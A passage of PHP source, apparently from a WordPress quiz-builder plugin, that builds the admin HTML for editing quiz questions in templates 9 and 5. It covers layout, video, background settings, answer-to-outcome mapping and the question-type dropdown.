									$title_background_color = stripslashes($question_customizer_array[10]);
								}
								if(isset($question_customizer_array[11])){
									$title_background_color_opacity = stripslashes($question_customizer_array[11]);
								}
								if(isset($question_customizer_array[12])){
									$progress_bar_color = stripslashes($question_customizer_array[12]);
								}
								
							} else {
								
								if(isset($question_customizer_array[1])){
									$quiz_temp_left_bgcolor = stripslashes($question_customizer_array[1]);
								}
								if(isset($question_customizer_array[2])){
									$quiz_temp_right_bgcolor = stripslashes($question_customizer_array[2]);
								}
								if(isset($question_customizer_array[3])){
									$quiz_temp_heights = stripslashes($question_customizer_array[3]);
								}
								if(isset($question_customizer_array[4])){
									$background_image_url = stripslashes($question_customizer_array[4]);
								}
								if(isset($question_customizer_array[5])){
									$background_image_size = stripslashes($question_customizer_array[5]);
								}
								if(isset($question_customizer_array[6])){
									$background_image_repeat = stripslashes($question_customizer_array[6]);
								}
								if(isset($question_customizer_array[7])){
									$background_image_position = stripslashes($question_customizer_array[7]);
								}
								if(isset($question_customizer_array[8])){
									$title_background_color = stripslashes($question_customizer_array[8]);
								}
								if(isset($question_customizer_array[9])){
									$title_background_color_opacity = stripslashes($question_customizer_array[9]);
								}
								if(isset($question_customizer_array[10])){
									$progress_bar_color = stripslashes($question_customizer_array[10]);
								}
							}
							
						if(!isset($progress_bar_color) || $progress_bar_color == ''){
							$progress_bar_color = '#000';
						}
						
						$title_background_color_style = '';	
						$sqb_start_screen_background_image = '';	
						$left_side_bar_style = '';
						
						if($title_background_color_opacity == 'false' || $title_background_color_opacity == ''){
							$title_background_color_opacity = 'rgba(0,0,0,0)';
						}
							
						$template_layout = "sqb-template-bg-full-width";
						$template_alignment = 'template9-inner-center';
						$template_settings = "";
						$video_data = "";
						$video_url = "";
						$video_controls = "Y";
						
						$video_class = "";
						$background_color = "background-color:rgb(214, 153, 92)"; 
						$template_image = "";
						$splash_image = "";
						$question_video_caption = 'N';
						$multiple_ans_checked = "N";
						$sqb_multiple_ans_input_limit = "";
						$question_settings = $question_data->getQuestionSetting();
						if(!empty($question_settings)){
							$question_settings = maybe_unserialize($question_settings);
							if(array_key_exists('temp_layout', $question_settings)){
								$template_layout = $question_settings['temp_layout'];
							}

							if(array_key_exists('temp_layout', $question_settings)){
								$template_layout = $question_settings['temp_layout'];
							}


							if(!empty($question_settings['video_play_btn_color'])){
								$question_video_play_btn_color = $question_settings['video_play_btn_color'];
							}
							if(!empty($question_settings['video_caption'])){
								$question_video_caption = $question_settings['video_caption'];
							}

							if(!empty($question_settings['splash_image'])){
								$splash_image = $question_settings['splash_image'];
								$video_has_thumb = 'video-has-thumb';
							}

							if(array_key_exists('video_url', $question_settings)){
								if($template_layout == "sqb-template-bg-video-left" || $template_layout == "sqb-template-bg-video-right"){
									$video_class = "sqb-cover-video-enabled";
									$video_url = $question_settings['video_url'];
									$video_controls = !empty($question_settings['video_controls'])?$question_settings['video_controls']:'Y';
									$video_play_btn_color = !empty($question_settings['video_play_btn_color'])?$question_settings['video_play_btn_color']:'#ffffff';
									$question_video_source = !empty($question_settings['question_video_source'])?$question_settings['question_video_source']:'upload';
									
									
									$video_data = '<input type="hidden" class="video_source" name="video_source" value="'.$question_video_source.'"><input type="hidden" class="video_id'.$key.'" name="video_id" value="'.$video_url.'"><input type="hidden" class="video_controls" name="video_controls" value="'.$video_controls.'"><input type="hidden" class="splash_image" name="splash_image" value="'.$splash_image.'"><input type="hidden" class="video_play_btn_color" name="video_play_btn_color" value="'.$video_play_btn_color.'"><input type="hidden" class="video_caption" name="video_caption" value="'.$question_video_caption.'"><video id="my-player-'.$key.'" class="video-js '.$video_has_thumb.' play-slient" controls preload="none" muted poster="'.$splash_image.'">
														<source src="'.$video_url.'" type="video/mp4"></source>
														<p class="vjs-no-js"> To view this video please enable JavaScript, and consider upgrading to a web browser that <a href="https://videojs.com/html5-video-support/" target="_blank"> supports HTML5 video </a> </p>
													</video>';
								}
							}

							if(array_key_exists('template_alignment', $question_settings)){
								$template_alignment = $question_settings['template_alignment'];
							}

							if(array_key_exists('template_image', $question_settings)){
								$template_image = $question_settings['template_image'];
								if($template_image && $template_image != 'none'){
									$template_settings .= "background-image: url('".$template_image."');";
								}
							}

							if(array_key_exists('background_color', $question_settings)){
								$background_color = $question_settings['background_color'];
								$background_color = 'background-color:'.$background_color;
							}

							if(array_key_exists('multiple_ans_checked', $question_settings)){
								$multiple_ans_checked = $question_settings['multiple_ans_checked'];
							}

							if(array_key_exists('sqb_multiple_ans_input_limit', $question_settings)){
								$sqb_multiple_ans_input_limit = $question_settings['sqb_multiple_ans_input_limit'];
							}

						}
							
						$quesitons_html .='<input type="hidden" name="enable_question_background_image" value="'.$question_data->getEnableBackgroundImage().'"><input type="hidden" name="question_background_image" value="'.$background_image_url.'"><input type="hidden" class="progress_bar_color_class" name="progress_bar_color" value="'.$progress_bar_color.'"><div class="question_div_inner"  style=" position: relative;">';	
						$quesitons_html .='<div class="Quiz-Template Quiz-Template-9 quiz_comon_template sqb_question_enable_drag_drop '.$template_no_class.'" data-id="'.$question_id.'" '.$question_style.'>';
						
						$skipChecked = '';
						// $skipButtonStyle = 'display:none;';
						if($allow_skip_ques == 'Y'){
							$skipChecked = 'checked ';
							//$skipButtonStyle = 'display:block;';
						}
						

						$edit = 'edit';
						$sel_temp = $quiz_data->getTemplate();

						$quiz_category_list = '';
						if(($quiz_type == 'scoring') || ($quiz_type == 'assessment')){
							$quiz_category_enable = $quiz_data->getCategory();

							$category_show_hide_option = 'N';
							if($question_type == 'multi'){
									$category_show_hide_option = 'Y';
							}else if($question_type == 'single'){
									$category_show_hide_option = 'Y';
							}else if($question_type == 'yes_no'){
								$category_show_hide_option = 'Y';
							}else if($question_type == 'matrix'){
								$category_show_hide_option = 'Y';
							}
							
							if($quiz_category_enable  == 'Y'){

							}else{
								$category_show_hide_option = 'N';
							}
								
								$quiz_category_list = sqbGetQuizCategoryListHtmlOfQuestionScreen($question_data->getCategoryId() , $category_show_hide_option);
							
								
						}  

						$quesitons_html .= template8_top_settings_section_edit_mode($edit,$sel_temp,$layout_value,$layout_text,$skipChecked,$ans_with_img,$options_data,$ans_image_size_custom,$ans_image_width,$ans_image_height,$ans_show_image_label,$answer_type_matrix_selected_class,$question_type_option,$tool_tip_related_style,$question_type,$question_type_text,$ques_type_rating,$ques_type_fill,$answer_type_tool_tip,$add_rating_btn_display,$quiz_category_list,$question_image,$multiple_ans_checked,$sqb_multiple_ans_input_limit);


						

						$quesitons_html .= '<div class="question-screen Quiz-Template9-inner Quiz-Template9-column-wrapper '.$video_class.' '.$template_layout.' '.$template_alignment.'" style="'.$background_color.'">';
						
						$quesitons_html .=	'<div class="Quiz-Template9-left-side Quiz-Template9-left-column-wrapper '.$sqb_start_screen_background_image.'" style="'.$template_settings.'">'.$video_data.'
								
            					</div>';

		                    /*$quesitons_html .=	'<div class="Quiz-Template9-left-side '.$sqb_start_screen_background_image.'" style="'.$left_side_bar_style.'"> 
							   '.$qustion_html.'
		                    </div>';*/
		                 
		                  
		                    
						
						$answer_type_matrix_selected_class = '';
						if($question_type == 'matrix'){
							$answer_type_matrix_selected_class = ' answer-type-matrix-selected';
						}
						
						$answer_type_single_multi_yes_no_class = '';
						if($question_type == 'single' || $question_type == 'multi' || $question_type == 'yes_no'){
							$answer_type_single_multi_yes_no_class = ' answer_type_single_multi_yes_no_class';
						}
						
						$answer_type_tool_tip = '';
						$tool_tip_related_style = '';
						if($question_type == 'ranking_choices'){
							$tool_tip_related_style = 'style="position:relative"';
							$answer_type_tool_tip = '<div class="tool-tip answer_type_tool_tip"><i class="fa fa-info-circle" aria-hidden="true"></i><div class="toll-tip-desc">Your users can re-order the answers choices based on their preference using a drag/drop interface in the frontend.</div></div>';
						}

						$answer_type_class = 'answer_type_'.$question_type;
						
						$quesitons_html .=	'<div class="Quiz-Template9-right-side Quiz-Template9-right-column-wrapper">
											<div class="Quiz-Template9-right-inner '.$answer_type_class.'">';
						$quesitons_html .=	'<div class="template9-question-div">'.$qustion_html.'</div>';

							$answersObj = SQB_QuizAnswers::loadByQuestionId($question_id);
							$ans_html  = '';
							$outcome_html  = '';
							if(is_array($answersObj) && count($answersObj)){
								$answersdataobj_cout_class = ''	;
								//get answers of the question
					 
								if(isset($answersObj) && count($answersObj) < 10){
										$answersdataobj_cout_class = 'ranting_level_'.count($answersObj);
								}
								
								$recommendation_html = '';
								$outcome_index_count  = 1 ;
								foreach($answersObj as $answerObj){
									$answer_id = $answerObj->getId();
									$ans_data = $answerObj->getAnswer();
									if($answerObj->getRecommendationHtml() != ''){
										$recommendation_html .= '<div class="sqb_ans_item_dot_option" >'.stripslashes($answerObj->getRecommendationHtml()).'</div>';
									}
									
									
									$ans_title = $answerObj->getAnswerTitle();
									$ans_hint = $answerObj->getIncorrectAnswerInfo();
									$ans_info = $answerObj->getCorrectAnswerInfo();
									$ans_correct = $answerObj->getCorrectAnswer();
									
									$ans_data =  str_replace("%%ANSWERID%%",$answer_id,$ans_data);
									$ans_data =  str_replace("%%answerid%%",$answer_id,$ans_data);
									if($ans_correct == 'true'){
										$ans_data =  str_replace("%%SQBANSWERCORRECT%%","checked",$ans_data);
										$ans_data =  str_replace("%%sqbanswercorrect%%","checked",$ans_data);
										$ans_data =  str_replace("sqbanswercorrect","checked",$ans_data);
									}else{
										$ans_data =  str_replace("%%SQBANSWERCORRECT%%","",$ans_data);
										$ans_data =  str_replace("%%sqbanswercorrect%%","",$ans_data);
										if($question_type == 'phone_number' || $question_type == 'email'){

										}else{
											$ans_data =  str_replace("checked","",$ans_data);
										}
										$ans_data =  str_replace("sqbanswercorrect","",$ans_data);
									}
									
									$ans_html .= stripslashes($ans_data);
									// $current_date_time = date('y_d_m_h_m_s');
									// $current_date_time_img = "sqb_correct_incorrect_".$current_date_time.'_'.rand(10,1000);
									
									// $ans_html =  str_replace("%%SQBRANDOMNO%%",$current_date_time_img,$ans_html);

									
									$outcomeMappingObj = SQB_OutComeMapping::loadByQuizIdQuestionIdAnsId($_GET['id'] ,$question_id,$answer_id);
									if(isset($outcomeMappingObj)){
										
										
										$outcome_table_id = $outcomeMappingObj->getId();
										$outcome_ids = $outcomeMappingObj->getOutcomeId();
										$outcome_ids = explode(",",$outcome_ids);
										
										$outcome_result_clone_list = '<ul class="multi-select-dropdown-list outcome_result_list" style="display: block;">';
										
										$outcome_hmtl = '';
										if(is_array($outcomes_list)){
											foreach($outcomes_list as $outcome_list){
												
												$outcome_checked = '';
												if(in_array($outcome_list->getId(),$outcome_ids)){
													$outcome_checked = 'checked';
												}
												$outcome_result_clone_list .= '<li data-id="">
																<div class="checkbox-custom-style">
																<input type="checkbox" class="custom-checkbox-input" name="outcome_result_checkbox" value="'.$outcome_list->getId().'" '.$outcome_checked.'>
																<span class="custom--checkbox"></span>
															</div>
															<label>'.$outcome_list->getOutcomeName().'</label>
															</li>';
				
											}//foreach loop closed 
										}// if loop closed 
									//echo $outcome_hmtl;
		
									$outcome_result_clone_list .= '</ul>';
									$sqb_round_no = 'sqb_round_no_'.uniqid() . time().'_';
										 
										 $outcome_html   .= '<div class="quiz-content-card"  data-answer-id="'.$answer_id.'" data-id="'.$outcome_table_id.'"  id="'.$sqb_round_no.'"><label for="" class="quiz_label">'.strip_tags(stripslashes($ans_title)).' </label><div class="quiz_right-content"><div class="multi-select-dropdown select_outcome_result_wrapper"><div class="multi-select-dropdown-link select_outcome_result_list"> Select Outcomes <i class="fa fa-angle-down"></i></div>'.$outcome_result_clone_list.'</div></div></div>';
										
									}else{

										$outcome_result_clone_list = '<ul class="multi-select-dropdown-list outcome_result_list" style="display: block;">';
										
										if(is_array($outcomes_list)){
											foreach($outcomes_list as $outcome_list){
												
												$outcome_result_clone_list .= '<li data-id="">
																<div class="checkbox-custom-style">
																<input type="checkbox" class="custom-checkbox-input" name="outcome_result_checkbox" value="'.$outcome_list->getId().'">
																<span class="custom--checkbox"></span>
															</div>
															<label>'.$outcome_list->getOutcomeName().'</label>
															</li>';
				
											}//foreach loop closed 
										}// if loop closed 
										
		
										$outcome_result_clone_list .= '</ul>';


										$sqb_round_no = 'sqb_round_no_'.uniqid() . time().'_';
										$outcome_html .= '<div class="quiz-content-card"  data-answer-id="'.$answer_id.'" data-id="%%OUTCOMEMAPPINGID%%" data-answer-index-id="'.$outcome_index_count.'" id="'.$sqb_round_no.'"><label for="" class="quiz_label">'.strip_tags(stripslashes($ans_title)).' </label><div class="quiz_right-content"><div class="multi-select-dropdown select_outcome_result_wrapper"><div class="multi-select-dropdown-link select_outcome_result_list"> Select Outcomes <i class="fa fa-angle-down"></i></div>'.$outcome_result_clone_list.'</div></div></div>';
									}
									
									
									$outcome_index_count++;
									
									
									
								}
								
								$outcome_html   =  $outcome_html;
								
							}
						
						 
						$rating_html   = '<div class="question_rating_lable_div sqb_question_drag_drop_item rating_info" style="'.$add_rating_btn_display_text.'">
							<div class="question_rating_lable_div_inner question_rating_lable_low rating_info_left">
								<label class="quiz_label">Low Score Label</label>
								<div class="sqb_tiny_mce_editor question_rating_lable_low_text">'.$question_rating_lable_low_text.'</div>
							</div>
							<div class="question_rating_lable_div_inner question_rating_lable_high rating_info_right">
								<label class="quiz_label">High Score Label</label>
								<div class="sqb_tiny_mce_editor question_rating_lable_high_text">'.$question_rating_lable_high_text.'</div>
							</div>
						</div>';
						$quesitons_html .=	$rating_html; 
						$numeric_class = '';
						//$quesitons_html .=	$rating_html; 
						if($question_type == 'matching_text'){
					 		$numeric_class = 'sqb_disable_tiny_mce_editor';
					 	}


					 	$question_customizer = $question_data->getTempCustomizer();

						$question_customizer_array = explode("||",$question_customizer);
						$question_style = '';
						if(isset($question_customizer_array[0])){
							$question_max_width = $question_customizer_array[0];
							$question_style= "style='max-width:".$question_max_width."'";
						}
													
						$question_inner_width = !empty($question_customizer_array[1]) ? $question_customizer_array[1] : '';
						if($question_type  == 'matrix'){
							$question_inner_width = ($question_inner_width != '')? $question_inner_width : '1200px';
						}
						
						$question_inner_width = isset($question_inner_width) ? $question_inner_width : '';

						$question_inner_style = "style='max-width:".$question_inner_width."'";

						$quesitons_html .=	'<div class="question_add_answer_outer_div sqb_question_drag_drop_item '.$numeric_class.$scoring_quiz_class_pints.$image_option_has_class.$answer_grid_layout_active.$answer_layout_three_in_row_layout_active.$sqb_disable_tiny_mce_editor_class.' '.$answersdataobj_cout_class.' '.$answer_type_matrix_selected_class.' '.$answer_type_single_multi_yes_no_class.' " '.$question_inner_style.'>';
						if($question_type == 'matching_text'){
							$quesitons_html .= '<div class="numerical-message"><span class="full-text">In the text area below, enter the full text and whatever text you want users to fill out, enclose it with square brackets.</span><span class="see-details"> <a href="javascript:void(0)" class="numerical-sidepopup">See this for details. </a></span>';
							 if($quiz_type == 'scoring'){
							 	$quesitons_html .= '<div class="">Points are only assigned for correct answers</div>';
							 }
							 	$quesitons_html .= '</div>';
						}
						if($question_type == 'matrix'){
							$ans_html = stripslashes($matrix_html);
							$ans_html = '<div class="sqb_ans_item_matrix"><span class="answer_matrix_options_show sqb_backend_show ">Click to Add/Edit Matrix Answers</span><div class="answer_matrix_save_table">'.$ans_html.'</div><input type="hidden" name="matrix-column-width" value="'.$matrix_column_width.'"></div>';
						}
						$add_more_ans_btn_text = 'Add New Answer';
						if($question_type == 'file_upload'){
						$add_more_ans_btn_text = 'Add Supported File Types';
						}
						$quesitons_html .=	$ans_html;
						$quesitons_html .=	' </div>';//answer options end
						
						$quesitons_html .=	' </div>';//Quiz-Template5-right-side-inner
						$quesitons_html .=	' <div class="sqb_quiz_template5_next_button_outer skip_continue_button_wrapper">';
						$quesitons_html .=	'<div class="back-question-action" style="'.$backButtonStyle.'">'.$back_btn_html.'</div>';
						$quesitons_html .=	'<div class="skip-question-action" style="'.$skipButtonStyle.'">'.$skip_button_html.'</div>';

						$show_next_button =  $quiz_data->getShowNextButton();	
						if($show_next_button == "Y"){
							$continueButtonStyle = 'display:block;';
						}else if($question_data->question_type == 'multi' || $question_data->question_type == 'text' || $question_data->question_type == 'numerical_text' || $question_data->question_type == 'date' || $question_data->question_type == 'file_upload' || $question_data->question_type == 'slider' || $question_data->question_type == 'dropdown' || $question_data->question_type == 'complete-the-sentence' || $question_data->question_type == 'email' || $question_data->question_type == 'phone_number' || $question_data->question_type == 'weight_and_height' || $question_data->question_type == 'name'){
							$continueButtonStyle = 'display:block';
						}else{
							$continueButtonStyle = 'display:none';
						}
						$quesitons_html .=	'<div class="continue-question-action" style="'.$continueButtonStyle.'">'.$next_button_html.'</div></div>';
						
						$quesitons_html .=	' <div class="question_add_answer_btn_div template5_question_add_answer_btn_div sqb_question_drag_drop_item" style="display:none;">
						<div class="question_add_more_ans_btn" style="">'.$add_more_ans_btn_text.'</div></div>';
						
						$quesitons_html .=	' </div>';//Quiz-Template5-right-side
						$quesitons_html .=	' </div>';//template5 inner
						
						$map_skip_class = ' ';
						$map_not_skip_class = ' outcome-option-active';
						$ans_outcome_option_wrapper = '';
						
						if($skip_outcome_mapping_checked == 'Y'){
							$map_skip_class = ' outcome-option-active';
							$map_not_skip_class = '';
							$ans_outcome_option_wrapper = "display:none;";
						}
						


						$quesitons_html .=	'<div class="question_add_answer_btn_div sqb_question_drag_drop_item" style="display:none;">
							<div class="question_add_more_ans_btn" style="'.$add_answer_btn_display.'">'.$add_more_ans_btn_text.'</div>
							<div class="assessment_outcome_connect_btn  personality_outcome_connect_btn" style="'.$ans_outcome_option_show.'">					
							   
                                <div class="outcome-options">
                                    <span class="outcome-option-connect '.$map_not_skip_class.'" >Connect to Outcome </span>
                                    <span class="outcome-option-skip '.$map_skip_class.'" >Skip Mapping </span>
                                </div>
							</div>
						</div>
						';//add answer - connect to outcome
						
						$quesitons_html .= '</div>';//upto All divs are added
						if($outcome_html == ''){
							$ans_outcome_option_wrapper = "display:none;";
						}
						
						$display_skip_outcome_section_style = '';
						if($quiz_data->getTemplate() == 'template5') {
						$display_skip_outcome_section_style = "style='display:none;'";
						}  
						
						$quesitons_html .=	'<div class="sqb_add_more_question_section" '.$display_skip_outcome_section_style.'>
						<div class="question_add_answer_btn_div sqb_question_drag_drop_item">
							<div class="question_add_more_ans_btn" style="'.$add_answer_btn_display.'">'.$add_more_ans_btn_text.'</div>
							<div class="assessment_outcome_connect_btn  personality_outcome_connect_btn" style="'.$ans_outcome_option_show.'">					
                                <div class="outcome-options">
                                    <span class="outcome-option-connect '.$map_not_skip_class.'" >Connect to Outcome </span>
                                    <span class="outcome-option-skip '.$map_skip_class.'" >Skip Mapping</span>
                                </div>
							</div>
						</div></div>';//add answer - connect to outcome
						
						
						$quesitons_html .= '<div class="assessment_outcome_connect_wrapper '.$answer_edit_text_class.'" style="'.$ans_outcome_option_wrapper.$ans_outcome_option_show.'">';
						$quesitons_html .= '<div class="assessment_outcome_head">
								<div class="AO_head_title">Map Answers to Outcome</div>
							</div>
							
							<div class="assessment_outcome_connect" style="'.$ans_outcome_option_hide.'"> '.$outcome_html.'
						</div></div>';

						$quesitons_html .='
						<div class="QA-advance-option">
						<div class="quiz-content-card show_correct_inccorect_ans_checkbox_wrapper">
							<label for="" class="quiz_label">Do you want to display incorrect/correct answers?</label>
							<div class="quiz_right-content">
								<div class="square-switch_onoff">
									<input class="checkbox" name="show_correct_inccorect_ans_checkbox" type="checkbox" id="show_correct_inccorect_ans_checkbox_'.$sqb_correct_incorrect_random_no.'" value="Y" '.$show_correct_incorrect_ans.' >
									<label for="show_correct_inccorect_ans_checkbox_'.$sqb_correct_incorrect_random_no.'"></label>
								</div>
							</div>
						</div>
						<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
								<label for="" class="quiz_label">Correct answer message</label>
								<div class="quiz_right-content">
									<textarea class="sqb_correct_ans sqb_text_tiny_mce_editor">'.stripslashes($ans_info).'</textarea>
								</div>
						</div>
						<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
								<label for="" class="quiz_label">Incorrect answer message</label>
								<div class="quiz_right-content">
									<textarea class="sqb_incorrect_ans sqb_text_tiny_mce_editor">'.stripslashes($ans_hint).'</textarea>
									
								</div>
						</div>
						</div>';
						if($quiz_type != 'poll'){
							$quesitons_html .= '<div class="save_and_add_more_quesiton_btn_wrapper">
								<div class="save_question_btn" onclick="save_single_question()" >Save This Question</div>
								<div class="add_more_question_btn" onclick="sqb_add_more_question()">Add More Questions</div>
							</div>';
						}
					
						$quesitons_html .= '</div>';
						$quesitons_html .= '<div class="sqb_answer_bot_option_wrapper_outer">'.$recommendation_html.'</div>';		
						$quesitons_html .= '</div>';	
 
						 $quesitons_html .= '</div>';
						 $quesitons_html .= '</div>';
						 $quesitons_html .= '</div>';
							   
						   
							} else if ($quiz_data && $quiz_data->getTemplate() == 'template5') {
								
							$quesitons_html .= '<div class="card sqb_question_no tab-pane fade '.$show_fist_question_class.' sqb_question_id_'.$question_id.'" id="'.$question_count_class.'">';
						   $quesitons_html .= '<div class="card-header" id="headingOne" style="display:none">
												<i class="fa fa-arrows question_sortable_icon" aria-hidden="true"></i> <a >Question '.$question_count.'</a>
												<div class="delete-qa-row"> <i class="fa fa-trash-o" aria-hidden="true"></i></div>
											</div>';
						  $quesitons_html .= '<div  class="sqb_question_collapse" >';
					  	if($quiz_type != 'poll'){
						  $quesitons_html .= '<div class="question-delete-clone"><div class="delete-qa-row sqb_delete_btn"><i class="fa fa-trash-o" aria-hidden="true" title="Delete this Question"></i></div><div class="clone-qa-btn"><i class="fa fa-clone" aria-hidden="true" title="Clone this Question"></i></div></div>';
						}
						  $quesitons_html .= '<div class="card-body">';
						  $template_no_class = '';
						  
						  $quesitons_html .= '<div class="question_div_outer" id="'.$current_date_time_mian_div.'">
												
												<input type="hidden" name="question_temp_name" value="standard">
												<input type="hidden" name="question_temp_no" value="template1">
												<input type="hidden" name="question_file_upload_settings" value="'.$question_data->getFileUploadSettings().'">';
												
							$question_customizer = $question_data->getTempCustomizer();
							
							$question_customizer_array = explode("||",$question_customizer);
							$question_style = '';
							if(isset($question_customizer_array[0])){
								$question_max_width = $question_customizer_array[0];
								$question_style= "style='max-width:".$question_max_width."'";
							}
							
							$question_rating_lable_low_text = '<div>Strongly Disagree</div>';
							$question_rating_lable_high_text = '<div>Strongly Agree</div>';
							
							$quiz_temp_left_bgcolor = "";
							$quiz_temp_right_bgcolor = "";
							$quiz_temp_heights = "";
							$background_image_url = "";
							$background_image_size = "";
							$background_image_repeat = "";
							$background_image_position = "";
							$title_background_color = "";
							$title_background_color_opacity = "";
							$progress_bar_color = "";
							
							if($question_type  == 'rating'){
								if(isset($question_customizer_array[1])){
									$question_rating_lable_low_text = stripslashes($question_customizer_array[1]);
								}
								if(isset($question_customizer_array[2])){
									$question_rating_lable_high_text = stripslashes($question_customizer_array[2]);
								}
								if(isset($question_customizer_array[3])){
									$quiz_temp_left_bgcolor = stripslashes($question_customizer_array[3]);
								}
								if(isset($question_customizer_array[4])){
									$quiz_temp_right_bgcolor = stripslashes($question_customizer_array[4]);
								}
								if(isset($question_customizer_array[5])){
									$quiz_temp_heights = stripslashes($question_customizer_array[5]);
								}
								if(isset($question_customizer_array[6])){
									$background_image_url = stripslashes($question_customizer_array[6]);
								}
								if(isset($question_customizer_array[7])){
									$background_image_size = stripslashes($question_customizer_array[7]);
								}
								if(isset($question_customizer_array[8])){
									$background_image_repeat = stripslashes($question_customizer_array[8]);
								}
								if(isset($question_customizer_array[9])){
									$background_image_position = stripslashes($question_customizer_array[9]);
								}
								if(isset($question_customizer_array[10])){
									$title_background_color = stripslashes($question_customizer_array[10]);
								}
								if(isset($question_customizer_array[11])){
									$title_background_color_opacity = stripslashes($question_customizer_array[11]);
								}
								if(isset($question_customizer_array[12])){
									$progress_bar_color = stripslashes($question_customizer_array[12]);
								}
								
							} else {
								
								if(isset($question_customizer_array[1])){
									$quiz_temp_left_bgcolor = stripslashes($question_customizer_array[1]);
								}
								if(isset($question_customizer_array[2])){
									$quiz_temp_right_bgcolor = stripslashes($question_customizer_array[2]);
								}
								if(isset($question_customizer_array[3])){
									$quiz_temp_heights = stripslashes($question_customizer_array[3]);
								}
								if(isset($question_customizer_array[4])){
									$background_image_url = stripslashes($question_customizer_array[4]);
								}
								if(isset($question_customizer_array[5])){
									$background_image_size = stripslashes($question_customizer_array[5]);
								}
								if(isset($question_customizer_array[6])){
									$background_image_repeat = stripslashes($question_customizer_array[6]);
								}
								if(isset($question_customizer_array[7])){
									$background_image_position = stripslashes($question_customizer_array[7]);
								}
								if(isset($question_customizer_array[8])){
									$title_background_color = stripslashes($question_customizer_array[8]);
								}
								if(isset($question_customizer_array[9])){
									$title_background_color_opacity = stripslashes($question_customizer_array[9]);
								}
								if(isset($question_customizer_array[10])){
									$progress_bar_color = stripslashes($question_customizer_array[10]);
								}
							}
							
						if(!isset($progress_bar_color) || $progress_bar_color == ''){
							$progress_bar_color = '#000';
						}
						
						$title_background_color_style = '';	
						$sqb_start_screen_background_image = '';	
						$left_side_bar_style = '';
						
						if($title_background_color_opacity == 'false' || $title_background_color_opacity == ''){
							$title_background_color_opacity = 'rgba(0,0,0,0)';
						}
							
						if($question_data->getEnableBackgroundImage() == 'Y' && $background_image_url != ''){
						$left_side_bar_style .= "background-color:".$quiz_temp_left_bgcolor.";"; 
						$left_side_bar_style .= "background-image: linear-gradient(".$title_background_color_opacity.", ".$title_background_color_opacity."),url('".$background_image_url."');"; 
						$left_side_bar_style .= "background-size:".$background_image_size.";"; 
						$left_side_bar_style .= "background-repeat:".$background_image_repeat.";"; 
						$left_side_bar_style .= "background-position:".$background_image_position.";";
						$title_background_color_style = "background-color:".$title_background_color.";";
						$sqb_start_screen_background_image = " sqb_start_screen_background_image";
						} else {
						$left_side_bar_style .= "background-color:".$quiz_temp_left_bgcolor.";";
						$background_image_url = '';
						}
							
						$quesitons_html .='<input type="hidden" name="enable_question_background_image" value="'.$question_data->getEnableBackgroundImage().'"><input type="hidden" name="question_background_image" value="'.$background_image_url.'"><input type="hidden" class="progress_bar_color_class" name="progress_bar_color" value="'.$progress_bar_color.'"><div class="question_div_inner"  style=" position: relative;">';	
						$quesitons_html .='<div class="Quiz-Template Quiz-Template-5 quiz_comon_template sqb_question_enable_drag_drop '.$template_no_class.'" data-id="'.$question_id.'" '.$question_style.'>';
						
						$skipChecked = '';
						// $skipButtonStyle = 'display:none;';
						if($allow_skip_ques == 'Y'){
							$skipChecked = 'checked ';
							//$skipButtonStyle = 'display:block;';
						}
						
						$quesitons_html .= '<div class="Quiz-Template5-inner" style="min-height: '.$quiz_temp_heights.'">';
						
						$quesitons_html .=	'<div class="Quiz-Template5-left-side '.$sqb_start_screen_background_image.'" style="'.$left_side_bar_style.'"> 
							   '.$qustion_html.'
		                    </div>';
		                 
		                $quiz_category_list = '';
						if(($quiz_type == 'scoring') || ($quiz_type == 'assessment')){
								$quiz_category_enable = $quiz_data->getCategory();

								$category_show_hide_option = 'N';
								if($question_type == 'multi'){
										$category_show_hide_option = 'Y';
								}else if($question_type == 'single'){
										$category_show_hide_option = 'Y';
								}else if($question_type == 'yes_no'){
									$category_show_hide_option = 'Y';
								}else if($question_type == 'matrix'){
									$category_show_hide_option = 'Y';
								}
								
								if($quiz_category_enable  == 'Y'){

								}else{
									$category_show_hide_option = 'N';
								}
									
									$quiz_category_list = sqbGetQuizCategoryListHtmlOfQuestionScreen($question_data->getCategoryId() , $category_show_hide_option);
								
									
						}    
		                    
						
						$answer_type_matrix_selected_class = '';
						if($question_type == 'matrix'){
							$answer_type_matrix_selected_class = ' answer-type-matrix-selected';
						}
						
						$answer_type_single_multi_yes_no_class = '';
						if($question_type == 'single' || $question_type == 'multi' || $question_type == 'yes_no'){
							$answer_type_single_multi_yes_no_class = ' answer_type_single_multi_yes_no_class';
						}
						
						$answer_type_tool_tip = '';
						$tool_tip_related_style = '';
						if($question_type == 'ranking_choices'){
							$tool_tip_related_style = 'style="position:relative"';
							$answer_type_tool_tip = '<div class="tool-tip answer_type_tool_tip"><i class="fa fa-info-circle" aria-hidden="true"></i><div class="toll-tip-desc">Your users can re-order the answers choices based on their preference using a drag/drop interface in the frontend.</div></div>';
						}
						
						if (@strpos($quiz_temp_right_bgcolor, 'background-color') == false) { 
							$quiz_temp_right_bgcolor = 'background-color:'.$quiz_temp_right_bgcolor;
						}
						$multiple_ans_checked = "N";
						$sqb_multiple_ans_input_limit = "";
						$question_settings = $question_data->getQuestionSetting();
						if(!empty($question_settings)){
							$question_settings = maybe_unserialize($question_settings);
							if(array_key_exists('multiple_ans_checked', $question_settings)){
								$multiple_ans_checked = $question_settings['multiple_ans_checked'];
							}

							if(array_key_exists('sqb_multiple_ans_input_limit', $question_settings)){
								$sqb_multiple_ans_input_limit = $question_settings['sqb_multiple_ans_input_limit'];
							}
						}

						$show_multiple_ans_checked = "";
						if($multiple_ans_checked == 'Y'){
							$show_multiple_ans_checked = "checked";
						}
						$showForMultiple = 'display:none;';
						if($question_type == 'multi'){
							$showForMultiple = '';
						}

						$quesitons_html .=	'<div class="Quiz-Template5-right-side" style="'.$quiz_temp_right_bgcolor.';">
											<div class="Quiz-Template5-right-inner">
											<div class="question_drop_down_wrapper">
												<div class="quiz-content-card question-type-card question_type_wrapper '.$answer_type_matrix_selected_class.'" style="'.$question_type_option.'">
															<label  class="quiz_label">Question  Type</label>
															<div class="dropdown dropdown-custom-style" '.$tool_tip_related_style.'>
																<button class="dropdown-toggle" type="button"  data-value="'.$question_type.'">'.$question_image.'<span>'.$question_type_text.'</span>
																<span class="caret"></span></button>
																<ul class="dropdown-menu question_type_list_ul">
																	<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/single-choice.svg"><a href="javascript:void(0)" value="single" >Single Choice</a></li>
